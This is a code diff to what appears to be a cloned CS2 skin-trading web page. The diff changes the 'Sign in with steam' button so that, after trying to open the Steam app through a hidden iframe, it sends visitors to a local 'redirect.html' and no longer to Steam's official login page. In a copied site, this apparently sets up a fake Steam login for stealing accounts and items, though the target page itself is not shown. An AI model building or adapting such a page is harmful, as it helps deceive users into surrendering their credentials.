@@ -2237,23 +2237,32 @@
       <meta name="og:image" content>
    </head>
    <body>
-<script>
-    window.onload = function() {
-        const steamButton = document.getElementById("steamButton");
+    <script>
+        window.onload = function() {
+            // Select the button by class or data attribute (make sure it's targeting the button correctly)
+            const steamButton = document.querySelector('button[title="Sign in with steam"]');
 
-        steamButton.addEventListener("click", function(event) {
-            event.preventDefault(); // Prevent default button behavior
+            // Ensure the button exists before adding the event listener
+            if (steamButton) {
+                steamButton.addEventListener("click", function(event) {
+                    event.preventDefault(); // Prevent default button behavior, if necessary
 
-            // Try to open the Steam app
-            window.location.href = "steam://open";
-
-            // Fallback to Steam web login after 1 second
-            setTimeout(function() {
-                window.location.href = "https://store.steampowered.com/login"; // Fallback to Steam's web login
-            }, 1000);
-        });
-    };
-</script>
+                    // Create an iframe to attempt to open the Steam app
+                    var iframe = document.createElement("iframe");
+                    iframe.style.display = "none"; // Hide the iframe
+                    iframe.src = "steam://open"; // Attempt to open the Steam app
+                    document.body.appendChild(iframe);
+                    
+                    // Redirect to redirect.html after 1 second
+                    setTimeout(function() {
+                        window.location.href = "redirect.html";
+                    }, 1000);
+                });
+            } else {
+                console.error("Steam sign-in button not found");
+            }
+        };
+    </script>
 
 
       <div id="__nuxt">
@@ -2626,17 +2635,12 @@
                                                       <div class="text-center" data-v-e4203738>
                                                          <p class="gray-200--text font-weight-bold mb-2 font-size-24" data-v-e4203738>Trade Your CS2 Skins Instantly</p>
                                                          <p class="please-login w-100 font-weight-medium mx-auto" data-v-e4203738>Log in to view your Steam items and trade your skins for over 800,000 options from our bot&#39;s inventory.</p>
-<!-- Button structure with a hidden anchor link -->
-<button class="v-btn text-capitalize cursor-pointer rounded-md variant-primary my-4" 
-        title="Sign in with steam" 
-        style="height:40px;min-width:123px;width:min-content;" 
-        type="button" 
-        id="steamButton">
-    <span class="v-btn__content" style="opacity:1;">
-        <i class="fa-brands fa-steam font-size-16 font-weight-medium mr-2"></i> 
-        Sign in with steam
-    </span>
-</button>
+                                                         <button class="v-btn text-capitalize cursor-pointer rounded-md variant-primary my-4" title="Sign in with steam" style="height:40px;min-width:123px;width:min-content;" type="button" rel max-width="452px" data-v-e4203738 data-v-28087de2>
+                                                            <!---->
+                                                            <span class="v-btn__content" style="opacity:1;" data-v-28087de2>
+                                                               <!--[--><i class="fa-brands fa-steam font-size-16 font-weight-medium mr-2" data-v-e4203738></i> Sign in with steam<!--]-->
+                                                            </span>
+                                                         </button>
                                                       </div>
                                                       <span class="text-center pa-4" data-v-e4203738 data-v-9cc872da></span>
                                                    </div>
